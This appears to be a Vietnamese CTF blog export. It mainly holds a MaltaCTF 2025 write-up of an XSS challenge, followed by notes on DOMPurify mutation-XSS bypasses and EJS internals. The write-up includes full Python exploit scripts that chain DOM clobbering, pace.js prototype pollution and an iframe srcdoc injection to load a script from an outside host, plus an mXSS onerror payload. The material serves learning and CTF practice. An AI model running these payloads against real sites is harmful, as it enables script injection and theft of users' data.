[{"content":" Malta CTF Giải này mình chỉ làm được có một bài thui \u0026hellip;. bài đầu khá dễ nên mình sẽ viết về câu 2.\nFancy text Bài này là một bài XSS nhưng sử dụng DOMPURIFY latest và CSP để chặn hầu hết mọi đường . Source code đơn giản như sau : index.html\n\u0026lt;head\u0026gt; \u0026lt;title\u0026gt;Fancy Text Generator!\u0026lt;/title\u0026gt; \u0026lt;link href=\u0026quot;https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace-theme-center-atom.min.css\u0026quot; rel=\u0026quot;stylesheet\u0026quot;\u0026gt; \u0026lt;link href=\u0026quot;/style.css\u0026quot; rel=\u0026quot;stylesheet\u0026quot;\u0026gt; \u0026lt;script integrity=\u0026quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026quot; src=\u0026quot;/loader.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;h1\u0026gt;Fancy text generator\u0026lt;/h1\u0026gt; \u0026lt;div id=\u0026quot;contentBox\u0026quot;\u0026gt;\u0026lt;%- text || \u0026quot;fancy text generator!\u0026quot; %\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;/br\u0026gt; \u0026lt;form action=\u0026quot;/\u0026quot; method=\u0026quot;GET\u0026quot;\u0026gt; \u0026lt;input name=\u0026quot;text\u0026quot; placeholder=\u0026quot;text to make fancy\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;submit\u0026quot; value=\u0026quot;submit\u0026quot;\u0026gt; \u0026lt;/form\u0026gt; \u0026lt;/body\u0026gt; loader.js\nscripts = { \u0026quot;pace\u0026quot;: \u0026quot;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js\u0026quot;, \u0026quot;main\u0026quot;: \u0026quot;/main.js\u0026quot;, } function appendScript(src) { let script = document.createElement('script'); script.src = src; document.head.appendChild(script); }; for (let script in scripts) { appendScript(scripts[script]); } main.js\nconst toFancyText = (text) =\u0026gt; { const fancyLowerStart = 0x1D51E; // 'a' const fancyUpperMap = { A: 0x1D504, B: 0x1D505, C: 0x212D, D: 0x1D507, E: 0x1D508, F: 0x1D509, G: 0x1D50A, H: 0x210C, I: 0x2111, J: 0x1D50D, K: 0x1D50E, L: 0x1D50F, M: 0x1D510, N: 0x1D511, O: 0x1D512, P: 0x1D513, Q: 0x1D514, R: 0x211C, S: 0x1D516, T: 0x1D517, U: 0x1D518, V: 0x1D519, W: 0x1D51A, X: 0x1D51B, Y: 0x1D51C, Z: 0x2128 }; return [...text].map(char =\u0026gt; { const code = char.charCodeAt(0); // a-z if (code \u0026gt;= 97 \u0026amp;\u0026amp; code \u0026lt;= 122) { return String.fromCodePoint(fancyLowerStart + (code - 97)); } // A-Z if (char in fancyUpperMap) { return String.fromCodePoint(fancyUpperMap[char]); } // Leave others (numbers, punctuation) unchanged return char; }).join(''); } contentBox.innerText = toFancyText(contentBox.innerText) server.js\nconst express = require('express') const app = express(); const createDOMPurify = require('dompurify'); const { JSDOM } = require('jsdom'); app.set('view engine', 'ejs'); app.use(express.static('static')) app.use((req, res, next) =\u0026gt; { res.set('Content-Security-Policy', \u0026quot;script-src 'sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=' 'strict-dynamic'; object-src 'none';\u0026quot;); next(); }); app.get('/', (req, res) =\u0026gt; { const window = new JSDOM('').window; const DOMPurify = createDOMPurify(window); ///return res.render('index', {text: DOMPurify.sanitize(req.query.text)}) return res.render('index', { text: req.query.text }) }) app.listen(process.env.PORT || 1337, () =\u0026gt; { console.log(`listening on ${process.env.PORT || 1337}`) }) Chương trình này làm gì . Cho phép user nhập input vào sau đó input sẽ đi qua hàm main và biến đổi sang các kí tự đặc biệt khác nhau. Sử dụng script intergrity để chống việc file loader.js bị thay đổi nên ta có thể loại bỏ việc load một file script khác từ bên ngoài vào. Dùng dompurify để loại bỏ hết các tag nguy hiểm. Sau đó mình đọc hàm loader.js thì thấy nó có thể load script đến \u0026ldquo;/main.js\u0026rdquo; và \u0026ldquo;pace.js\u0026rdquo; .Sau khi check csp thì mình thấy nó thiếu base uri check . Nhưng Dompurify vẫn sẽ sanitize nó . Làm sao không bị ảnh hưởng bởi hàm fancy text. Lúc này mình vẫn không biết làm sao để lấy được xss nên mình nghĩ đến việc làm sao để truyền payload tùy ý vào mà không bị ảnh hưởng bởi fancyText đã.\nLúc này mình thấy có bug Dom clobbering ở chỗ\ncontentBox.innerText = toFancyText(contentBox.innerText) Vậy ta có thể chèn bất kì tag nào với id \u0026ldquo;contentBox\u0026rdquo; thì nó sẽ crash cái hàm main này và ta có thể dùng html injection Nhưng vấn đề lớn nhất vẫn là Dompurify và mình đã bí từ đây.. Sau đó mình nghĩ đến việc dom cloberring được biến scripts Nhưng sau khi thử thì mình nhận ra Dompurify đã tính đến trường hợp này :vv . Mình có thể clober \u0026ldquo;script\u0026rdquo; nhưng \u0026ldquo;scripts\u0026rdquo; thì không . Xem hình bên dưới ( mình sẽ tìm hiểu vấn đề này sau\u0026hellip;) Nhưng mình nhận ra là cho dù có dom cloberring được thì cũng chẳng có ý nghĩa gì vì javascript scope ở đây. Vậy là tới đây mình bí toàn tập \u0026hellip;. Đọc write up Sau khi đọc write up mình đã nhận ra cái ngu của mình. Đó là mình đã quên kiểm tra package \u0026ldquo;pace.js\u0026rdquo; được load vào \u0026hellip;. Đáng lẽ ra mình phải kiểm tra mọi input được đi vào app của mình mới đúng. Đến đây thì đọc source của pace.js là được. Sau đó thì mình tìm được report này vào năm 2024 , yeah 2024 :) https://github.com/CodeByZach/pace/issues/546 Một bug khá lớn nhưng có vẻ bên developers không còn maintain nữa. Bản chất của bug này cũng là merge prototype thui. extend = function() { var key, out, source, sources, val, _i, _len; out = arguments[0], sources = 2 \u0026lt;= arguments.length ? __slice.call(arguments, 1) : []; for (_i = 0, _len = sources.length; _i \u0026lt; _len; _i++) { source = sources[_i]; if (source) { for (key in source) { if (!__hasProp.call(source, key)) continue; val = source[key]; if ((out[key] != null) \u0026amp;\u0026amp; typeof out[key] === 'object' \u0026amp;\u0026amp; (val != null) \u0026amp;\u0026amp; typeof val === 'object') { extend(out[key], val); } else { out[key] = val; } } } } return out; }; Và mình sẽ có thể OBJECT PROTOTYPE bất kì biến nào chỉ với :\n\u0026lt;img id=\u0026quot;data-pace-options\u0026quot; data-pace-options='{\u0026quot;__proto__\u0026quot;: {\u0026quot;polluted\u0026quot;: \u0026quot;YOU ARE POLLUTED!\u0026quot;}}'\u0026gt; Đến đây thì ý tưởng của bài write up là Object prototype một biến bất kì có giá trị bằng một script source của attacker . Mục đích chính là pollute biến script trong loader.js scripts = { \u0026quot;pace\u0026quot;: \u0026quot;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js\u0026quot;, \u0026quot;main\u0026quot;: \u0026quot;/main.js\u0026quot;, } function appendScript(src) { let script = document.createElement('script'); script.src = src; document.head.appendChild(script); }; // This will loop through our \u0026quot;polluted\u0026quot; : \u0026quot;//attacker.js\u0026quot; for (let script in scripts) { appendScript(scripts[script]); } Đọc đến đây mình thấy khá bất ngờ khi object prototype có thể ảnh hưởng đến cả loop for in ? Test thử thì mình thấy quả thật vậy; scripts = { \u0026quot;pace\u0026quot;: \u0026quot;https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js\u0026quot;, \u0026quot;main\u0026quot;: \u0026quot;/main.js\u0026quot;, } Object.prototype.polluted = \u0026quot;FUCKED\u0026quot; console.log(\u0026quot;Just log it out : \u0026quot;, scripts) for (let script in scripts) { console.log(\u0026quot;[\u0026quot; + script + \u0026quot;] =\u0026gt; \u0026quot; + scripts[script]) } /*OUTPUT : Just log it out : { pace: 'https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js', main: '/main.js' } [pace] =\u0026gt; https://cdn.jsdelivr.net/npm/pace-js@latest/pace.min.js [main] =\u0026gt; /main.js [polluted] =\u0026gt; FUCKED */ Hmmmm, nhìn rất lạ nhỉ . Sau khi đọc docs thì mình thấy for in sẽ loop qua những enumerables của chính nó và cả những enumerables của Object.prototype ~~\nThông tin chi tiết về thế nào là enumberables chúng ta có thể xem ở đây : https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Enumerability_and_ownership_of_properties Và các hàm để kiểm tra enumrables hay không : Ta có thể thấy hàm in khi này sẽ xem Enumrable + inherited là true và chính vì thế script của mình sẽ bị polluted khi for in qua. Vấn đề cuối cùng Đọc write up thì mình thấy có vẻ còn một bug ở trong pace js để có thể chèn html injection nữa : var _custom_class_name = (options.className !== '') ? ' ' + options.className : ''; this.el.innerHTML = '\u0026lt;div class=\u0026quot;pace-progress' + _custom_class_name + '\u0026quot;\u0026gt;\\n \u0026lt;div class=\u0026quot;pace-progress-inner\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;\\n\u0026lt;/div\u0026gt;\\n\u0026lt;div class=\u0026quot;pace-activity\u0026quot;\u0026gt;\u0026lt;/div\u0026gt;'; Đơn giản là dùng options className ròi inject vào nhưng vì mình đã có free html injection ròi nên làm ngắn thui..\nimport requests url =\u0026quot;https://fancy-text-generator-web.shared.challs.mt/\u0026quot; url =\u0026quot;http://localhost:1337\u0026quot; html = '''\u0026lt;img id=\u0026quot;data-pace-options\u0026quot; data-pace-options='{\u0026quot;__proto__\u0026quot;: {\u0026quot;polluted\u0026quot;: \u0026quot;https://nj2n2pew.requestrepo.com/ex.js\u0026quot;}}'\u0026gt; ''' text = html + '\u0026lt;a id =\u0026quot;contentBox\u0026quot;\u0026gt;' res = requests.get(url,params={\u0026quot;text\u0026quot;:text}) print(res.text) print(text) Vậy là đã polluted thành công . Đến đây thì vấn đề là mình cần gọi script /loader.js một lần nữa để load vào nhưng mình không thể bypass được DOM purify . Cuối cùng vẫn phải dùng gadget className của pace js thui :vvv . Nó sẽ giúp mình bypass bằng cách mọi payload đều nằm trong một html attribute nên sẽ valid khi đi qua Dompurify. Sau một hồi ngồi escape các thứ thì mình có script sau : import requests import urllib.parse import html url =\u0026quot;http://localhost:1338\u0026quot; url =\u0026quot;https://fancy-text-generator-web.shared.challs.mt\u0026quot; options = \u0026quot;\u0026quot; #htmls = '''\u0026lt;img id=\u0026quot;data-pace-options\u0026quot; data-pace-options='{\u0026quot;__proto__\u0026quot;: {\u0026quot;polluted\u0026quot;: \u0026quot;https://nj2n2pew.requestrepo.com/ex.js\u0026quot;}}'\u0026gt;\u0026lt;script\u0026gt;alert()\u0026lt;/script\u0026gt;''' def html_encode(s): return s.replace(\u0026quot;\u0026amp;\u0026quot;, \u0026quot;\u0026amp;amp;\u0026quot;).replace(\u0026quot;\u0026lt;\u0026quot;, \u0026quot;\u0026amp;lt;\u0026quot;).replace(\u0026quot;\u0026gt;\u0026quot;, \u0026quot;\u0026amp;gt;\u0026quot;).replace('\u0026quot;', \u0026quot;\u0026amp;quot;\u0026quot;).replace(\u0026quot;'\u0026quot;, \u0026quot;\u0026amp;#39;\u0026quot;) payload ='''aaaa\\\\\u0026quot;\u0026gt;\u0026lt;script integrity=\\\\\u0026quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\\\\\u0026quot; src=\\\\\u0026quot;/test.js?version=1\\\\\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;''' htmls = f'\u0026lt;img id=\u0026quot;data-pace-options\u0026quot; data-pace-options=\\'{{\u0026quot;startOnPageLoad\u0026quot;:true,\u0026quot;__proto__\u0026quot;:{{\u0026quot;polluted\u0026quot;:\u0026quot;https://nj2n2pew.requestrepo.com/ex.js\u0026quot;}},\u0026quot;className\u0026quot;: \u0026quot;{payload}\u0026quot;}}\\'\u0026gt;' text = htmls + '\u0026lt;a id =\u0026quot;contentBox\u0026quot;\u0026gt;' res = requests.get(url,params={\u0026quot;text\u0026quot;:text}) print(res.text) print(payload) print(url + \u0026quot;?text=\u0026quot; + urllib.parse.quote(text)) Đến đây thì script của mình được load rồi nhưng mà nó không gọi bất kì request nào cả ? Vì sao ???? Đến đây thì mình mới nhớ là innerHTML không cho phép script chạy :vv . Bypass bằng iframe là xong\nimport requests import urllib.parse import html url =\u0026quot;http://localhost:1338\u0026quot; url =\u0026quot;https://fancy-text-generator-web.shared.challs.mt\u0026quot; options = \u0026quot;\u0026quot; #htmls = '''\u0026lt;img id=\u0026quot;data-pace-options\u0026quot; data-pace-options='{\u0026quot;__proto__\u0026quot;: {\u0026quot;polluted\u0026quot;: \u0026quot;\u0026quot;}}'\u0026gt;\u0026lt;script\u0026gt;alert()\u0026lt;/img\u0026gt;''' def html_encode(s): return s.replace(\u0026quot;\u0026amp;\u0026quot;, \u0026quot;\u0026amp;amp;\u0026quot;).replace(\u0026quot;\u0026lt;\u0026quot;, \u0026quot;\u0026amp;lt;\u0026quot;).replace(\u0026quot;\u0026gt;\u0026quot;, \u0026quot;\u0026amp;gt;\u0026quot;).replace('\u0026quot;', \u0026quot;\u0026amp;quot;\u0026quot;).replace(\u0026quot;'\u0026quot;, \u0026quot;\u0026amp;#39;\u0026quot;) payload ='''aaaa\\\\\u0026quot;\u0026gt;\u0026lt;iframe srcdoc =\\\\\u0026quot;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;img id=\u0026amp;amp;quot;data-pace-options\u0026amp;amp;quot; data-pace-options=\u0026amp;amp;#39;{\u0026amp;amp;quot;__proto__\u0026amp;amp;quot;: {\u0026amp;amp;quot;polluted\u0026amp;amp;quot;: \u0026amp;amp;quot;https://nj2n2pew.requestrepo.com/ex.js\u0026amp;amp;quot;}}\u0026amp;amp;#39;\u0026gt;\\\\\u0026quot;\u0026gt;''' htmls = f'\u0026lt;img id=\u0026quot;data-pace-options\u0026quot; data-pace-options=\\'{{\u0026quot;startOnPageLoad\u0026quot;:true,\u0026quot;__proto__\u0026quot;:{{\u0026quot;polluted\u0026quot;:\u0026quot;https://nj2n2pew.requestrepo.com/ex.js\u0026quot;}},\u0026quot;className\u0026quot;: \u0026quot;{payload}\u0026quot;}}\\'\u0026gt;' text = htmls + '\u0026lt;a id =\u0026quot;contentBox\u0026quot;\u0026gt;' res = requests.get(url,params={\u0026quot;text\u0026quot;:text}) print(res.text) print(payload) print(url + \u0026quot;?text=\u0026quot; + urllib.parse.quote(text)) Đến đoạn này thì còn một vấn đề là loader.js của mình sẽ luôn được load trước khi pace-js được load . Mình có thể tạo một hanging server và gửi loader.js đúng với file ban đầu để không bị lỗi intergriti\nfrom flask import Flask, send_file from flask_cors import CORS import time app = Flask(__name__) CORS(app) # Enable CORS for all routes @app.route('/loader.js') def serve_js(): time.sleep(3) return send_file('src/static/loader.js', mimetype='application/javascript') if __name__ == '__main__': app.run(host='0.0.0.0', port=3000) Full script :\nimport requests import urllib.parse import html url =\u0026quot;http://localhost:1338\u0026quot; url =\u0026quot;https://fancy-text-generator-web.shared.challs.mt\u0026quot; options = \u0026quot;\u0026quot; #htmls = '''\u0026lt;img id=\u0026quot;data-pace-options\u0026quot; data-pace-options='{\u0026quot;__proto__\u0026quot;: {\u0026quot;polluted\u0026quot;: \u0026quot;\u0026quot;}}'\u0026gt;\u0026lt;script\u0026gt;alert()\u0026lt;/img\u0026gt;''' def html_encode(s): return s.replace(\u0026quot;\u0026amp;\u0026quot;, \u0026quot;\u0026amp;amp;\u0026quot;).replace(\u0026quot;\u0026lt;\u0026quot;, \u0026quot;\u0026amp;lt;\u0026quot;).replace(\u0026quot;\u0026gt;\u0026quot;, \u0026quot;\u0026amp;gt;\u0026quot;).replace('\u0026quot;', \u0026quot;\u0026amp;quot;\u0026quot;).replace(\u0026quot;'\u0026quot;, \u0026quot;\u0026amp;#39;\u0026quot;) payload ='''aaaa\\\\\u0026quot;\u0026gt;\u0026lt;iframe srcdoc =\\\\\u0026quot;\u0026lt;img id=\u0026amp;amp;quot;data-pace-options\u0026amp;amp;quot; data-pace-options=\u0026amp;amp;#39;{\u0026amp;amp;quot;__proto__\u0026amp;amp;quot;: {\u0026amp;amp;quot;polluted\u0026amp;amp;quot;: \u0026amp;amp;quot;https://nj2n2pew.requestrepo.com/ex.js\u0026amp;amp;quot;}}\u0026amp;amp;#39;\u0026gt;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\u0026lt;script crossorigin=\u0026amp;amp;quot;anonymous\u0026amp;amp;quot;integrity=\u0026amp;amp;quot;sha256-1ltlTOtatSNq5nY+DSYtbldahmQSfsXkeBYmBH5i9dQ=\u0026amp;amp;quot; src=\u0026amp;amp;quot;https://commissioners-mozilla-messenger-compressed.trycloudflare.com/loader.js\u0026amp;amp;quot;\u0026gt;\u0026lt;/script\u0026gt;\\\\\u0026quot;\u0026gt;''' htmls = f'\u0026lt;img id=\u0026quot;data-pace-options\u0026quot; data-pace-options=\\'{{\u0026quot;startOnPageLoad\u0026quot;:true,\u0026quot;__proto__\u0026quot;:{{\u0026quot;polluted\u0026quot;:\u0026quot;https://nj2n2pew.requestrepo.com/ex.js\u0026quot;}},\u0026quot;className\u0026quot;: \u0026quot;{payload}\u0026quot;}}\\'\u0026gt;' text = htmls + '\u0026lt;a id =\u0026quot;contentBox\u0026quot;\u0026gt;' res = requests.get(url,params={\u0026quot;text\u0026quot;:text}) print(res.text) print(payload) print(url + \u0026quot;?text=\u0026quot; + urllib.parse.quote(text)) Dùng script với cross-origin = anonymous để request cors enabled. Đến đây là xong bài rùi \u0026hellip;\nflag : maltactf{oops_my_dependency_is_buggy_05b19465ce19db4e28ddb00bb19f101e}\nCảm nhận : Giải này khá là khoai :vv mới câu 2 thui mà mình đã quá ngu ròi. Thi xong sẽ quay lại làm mấy câu còn lại bruhh. Sai lầm : Không kiểm tra hết input vào một app Quá tin tưởng vào package latest :( Skill issue khi làm việc với html entity encode New knowledge : Object prototype in latest pace-js Enumerable inherit trong for in và vâng vâng Script intergrity check Audit sau giải Dompurify id \u0026ldquo;script\u0026rdquo; and \u0026ldquo;scripts\u0026rdquo; Style with background can make xs leak with no csp ? \u0026ndash; ","permalink":"https://3HLD.github.io/writeups/maltactf2025/fancy/","title":"FANCY TEXT"},{"content":" l3akctf2025 Performance Summary CTFs: 8/22 Total points: 3863 Position: 40 Rating points: 7.132 Writeups Category flagguessr dumber ","permalink":"https://3HLD.github.io/writeups/l3akctf2025/","title":"l3akctf2025"},{"content":" MaltaCTF 2025 Performance Summary Total points: 301 Position: 85 Rating points: ? Writeups Category Fancy ","permalink":"https://3HLD.github.io/writeups/maltactf2025/","title":"MaltaCTF 2025"},{"content":" DEEP DOWN TO DOMPURIFY Some note when learning mxss. Source : https://mizu.re/post/exploring-the-dompurify-library-bypasses-and-fixes\nDOWPURFIY WORKFLOWS : initDocument : Dùng API DOMParser để parse dữ liệu đúng như Browser parse createNodeIterator : Dùng API NodeIterator để iterate qua tất cả các node sanitizeElement : Kiểm tra tag allowed or not _sanitizeShadowDOM : The NodeIterator API doesn\u0026rsquo;t iterate over the template tag by default. Recursively sanitizes when it reaches a DocumentFragment. _sanitizeAttributes : dùng dom apis để sanitize HTML attributes . Output How MXSS happens : Vậy thì DOMPurify sử dụng cùng một hệ thống dom parser với browser vậy thì làm thế nào mà MXSS xảy ra . Có một vấn đề khá lớn đã được đề cập trong w3c : Parse một html string 2 lần có thể dẫn đến những kết quả khác nhau . Ví dụ : Dựa vào tính chất không chứa tag form trong form ta có thể khiến mutation xảy ra : Note : Kết quả domparser đầu tiên là thứ mà DOM purify thấy và đã check xong return về. Kết quả thứ 2 là những gì browser cho ra cuối cùng Đọc thêm ở : https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/?utm_source=chatgpt.com Foreign Content Hầu hết các element sẽ thuộc HTML namespace nhưng cũng có một vài element như svg và math thì svg và math sẽ thuộc cái namespace khác nhau gọi chung là Foreign Content .\nCụ thể có sự khác biệt giữa tag style trong HTML namespace vs SVG namespace . Trong html namespace thì trong style chỉ chứa text nhưng trong svg thì chứa cả element .Nhưng không hẳn là lúc nào trong foreign content thì cũng không chứa HTML namespace , ta sẽ có một vài điểm để bật html gọi là intergration point. Chỉ khi token đầu tiên trong mtext là mglyph hoặc malign mark Rules to decide the namespace : Node Flattening Một câu hỏi khá hay là DOM có thể sâu tới bao nhiêu layers ? Không có một giới hạn cụ thể nào nên phụ thuộc vào thư viện\nỒ vậy là chính DOM parser đã có limit là 512 nested Node và sẽ Flattening ? Ta có thể thấy khi vượt ngưỡng nó sẽ flat tag nested cuối cùng . Và kết quả sau khi reparse là : HTML Parsing State : Ta sẽ cần hiểu 2 concepts sau :\nInsertion modes Stack of open elements Ta sẽ tập trung vào insert modes của captions in table tag : Ta sẽ thấy nếu như đang trong mode in caption mà gặp thêm một tag caption nữa thì sẽ pop stack cho tới khi caption được pop out ra sau đó chuyển về in tables mode . Stack đơn giản là đọc từ trên xuống và đưa vào stack khi là start tag và pop khi là close tag . Vậy what could go wrong. Ta nhìn vào snippet sau :\n\u0026lt;table\u0026gt; \u0026lt;caption\u0026gt; \u0026lt;div\u0026gt;before\u0026lt;/div\u0026gt; \u0026lt;caption\u0026gt;\u0026lt;/caption\u0026gt; \u0026lt;div\u0026gt;after\u0026lt;/div\u0026gt; \u0026lt;/caption\u0026gt; \u0026lt;/table\u0026gt; Khi parser đọc đến caption tag đầu tiên nó sẽ được vào stack và khi chạm phải open tag caption tiếp theo nó sẽ bắt đầu close tag cho đến khi caption đã được pop out khỏi tag và switch sang intable mode dẫn đến việc trên stack không tồn tại caption nữa và tag \u0026lt;/caption\u0026gt; cũng vô nghĩa =\u0026gt; div after sẽ bị chuyển về intable modes nhưng vì divs cũng không hợp lệ trong tables dẫn đến bị pop out ra và cho kết quả như sau : Nhưng có một vấn đề cuối cùng là caption không thể được nest như trong snippet thế nên để bypass cái này thì ta sẽ lợi dụng Node Flattening và kết quả là : Ta đã có caption nested in caption và mxss go here\nFinal payload : https://yeswehack.github.io/Dom-Explorer/frame?input=editable\u0026amp;titleBar=readonly\u0026amp;readonly=true\u0026amp;pipe[titleBar]=true\u0026amp;pipe[settings]=true\u0026amp;pipe[render]=true\u0026amp;pipe[skip]=true/#eyJpbnB1dCI6IjxkaXYqNTA2PlxuPHRhYmxlPlxuICA8Y2FwdGlvbj5cbiAgICA8c3ZnPlxuICAgICAgPHRpdGxlPlxuICAgICAgICA8dGFibGU+PGNhcHRpb24+PC9jYXB0aW9uPjwvdGFibGU+XG4gICAgICA8L3RpdGxlPlxuICAgICAgPHN0eWxlPjxhIGlkPVwiPC9zdHlsZT48aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoKT5cIj48L2E+PC9zdHlsZT5cbiAgICA8L3N2Zz5cbiAgPC9jYXB0aW9uPlxuPC90YWJsZT4iLCJwaXBlbGluZXMiOlt7ImlkIjoiMGFkcXN1YWoiLCJuYW1lIjoiRG9tIFRyZWUiLCJwaXBlcyI6W3sibmFtZSI6IkRvbVB1cmlmeSIsImlkIjoiZXJsNXR6ZXMiLCJoaWRlIjp0cnVlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ2ZXJzaW9uIjoiMy4xLjAiLCJvcHRpb25zIjoie30ifX0seyJuYW1lIjoiRG9tUGFyc2VyIiwiaWQiOiJiNTRyd2RiNSIsImhpZGUiOmZhbHNlLCJza2lwIjpmYWxzZSwib3B0cyI6eyJ0eXBlIjoidGV4dC9odG1sIiwic2VsZWN0b3IiOiJib2R5Iiwib3V0cHV0IjoiaW5uZXJIVE1MIiwiYWRkRG9jdHlwZSI6dHJ1ZX19XX1dfQ== BUMP ELEMENT CÁI GÌ ĐANG XẢY RA Ở ĐÂY V ? : Cùng đọc docs nhé https://html.spec.whatwg.org/multipage/parsing.html#parsing-main-intable\nCó vẻ là do\u0026lt;/form\u0026gt; nên mới bug ở đây Xóa start form thì vẫn ăn =)) vậy tức là do thằng cu \u0026lt;/form\u0026gt; mẹ ròi\nVi \u0026lt;/form\u0026gt; la invalid tag sẽ fallback về foster parenting Cơ chế foster parenting Trong HTML parsing, foster parenting là một cơ chế đặc biệt được quy định trong HTML parsing algorithm để xử lý một số trường hợp không hợp lệ (misnested), cụ thể là khi bạn chèn các thẻ không hợp lệ vào giữa các thẻ như \u0026lt;table\u0026gt;, \u0026lt;tbody\u0026gt;, \u0026lt;tr\u0026gt;, v.v.\nVí dụ trường hợp là tag h1 Thì sẽ được đẩy vào form , vì form không thể chứa \u0026lt;form\u0026gt; như ta đã biết nhưng còn **\u0026lt;/form\u0026gt;** thì sao ? Khi nhảy ra ngoài form nó cũng không valid nên nó nhảy ra tới tag body và vì thế ôm luôn thằng div ?? Sau một hồi test thì có vẻ không phải như vậy. Vậy nguyên nhân là do đâu mà BUMP hoạt động ?\nFinal : Sau một hồi đọc docx thì mình cũng nhận ra điều sau : Ta thấy khi gặp \u0026lt;/form\u0026gt; sẽ có những action sau, đặc biệt là 2. và 3. khi kết hợp lại có thể xóa đi một form element pointer nhưng vẫn không xóa node đó khỏi stack Điều kiện số 3 sẽ kiểm tra có node trong scope hay không ? Thế nghĩa là sao ? Ta nhìn vào đoạn sau : Hiểu đơn giản là : Một phần tử được coi là \u0026ldquo;in scope\u0026rdquo; nếu nó nằm trên stack, và không bị \u0026ldquo;che mất\u0026rdquo; bởi các phần tử đặc biệt khác như table, select, template, etc.\nKhi được foster parenting stack hiện là : [body , form , table ] với table là blocking tag nên khi trigger \u0026lt;/form\u0026gt; sẽ trigger trường hợp thứ ba nhưng đồng thời set form element về null dẫn đến \u0026lt;/form\u0026gt; cuối cùng không đóng form này lại được . và form vẫn nằm trên stack và nhận children =)))) =\u0026gt; \u0026lt;/form\u0026gt; đã bị chặn bởi tag table\nTổng kết flow như sau : Dựa trên điều đó ta có thể thay thế blocking scope tag và có cùng effect : ","permalink":"https://3HLD.github.io/writeups/mxss/","title":"Some note on MXSS"},{"content":" DEEP DOWN TO EJS Example usage : Đơn giản như sau thui : const ejs = require(\u0026quot;ejs\u0026quot;) const template = '\u0026lt;h1\u0026gt;Hello \u0026lt;%= name %\u0026gt;\u0026lt;/h1\u0026gt;'; ejs.clearCache(); const data = { name: \u0026quot;12113awefeaw\u0026quot; } const compiled = ejs.render(template, data, {}); console.log(compiled.toString()) How ejs works Ta cùng đọc qua về hàm render :\nexports.render = function (template, d, o) { var data = d || utils.createNullProtoObjWherePossible(); var opts = o || utils.createNullProtoObjWherePossible(); // No options object -- if there are optiony names // in the data, copy them to options if (arguments.length == 2) { utils.shallowCopyFromList(opts, data, _OPTS_PASSABLE_WITH_DATA); } return handleCache(opts, template)(data); }; Hàm nhận vào data và options . Nếu không có options thì kiểu tra data xem có key nào có thể cho vào OPTIONS hay không theo danh sách trên : var _OPTS_PASSABLE_WITH_DATA = ['delimiter', 'scope', 'context', 'debug', 'compileDebug', 'client', '_with', 'rmWhitespace', 'strict', 'filename', 'async']; Sau đó gọi hàm handleCache nhận về một function và cho data làm đối số. Vậy ta sẽ phải tìm hiểu hàm handleCache sẽ trả về function gì . handleCache :\nfunction handleCache(options, template) { var func; var filename = options.filename; var hasTemplate = arguments.length \u0026gt; 1; if (options.cache) { if (!filename) { throw new Error('cache option requires a filename'); } func = exports.cache.get(filename); if (func) { return func; } if (!hasTemplate) { template = fileLoader(filename).toString().replace(_BOM, ''); } } else if (!hasTemplate) { // istanbul ignore if: should not happen at all if (!filename) { throw new 